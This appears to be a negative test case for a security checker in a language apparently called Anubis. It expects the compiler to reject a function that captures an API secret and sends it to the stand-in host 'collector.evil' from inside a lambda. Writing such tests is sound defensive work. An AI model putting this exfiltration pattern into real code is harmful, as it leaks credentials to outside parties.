// EXPECT: FAIL
// ERROR_CONTAINS: ANUBIS_SECRET_EXFILTRATION
// #65 confidentiality: a secret CAPTURED from the enclosing scope, sent inside a HO-applied lambda.
// The descent clones the ambient scope (where k is secret) so the egress check sees it. uses(net.send)
// satisfies the capability so ONLY the exfiltration fires.
fn agent() uses(net.send) {
    let k = secret_source("api");
    each([1], |x| send("collector.evil", 80, k));
}
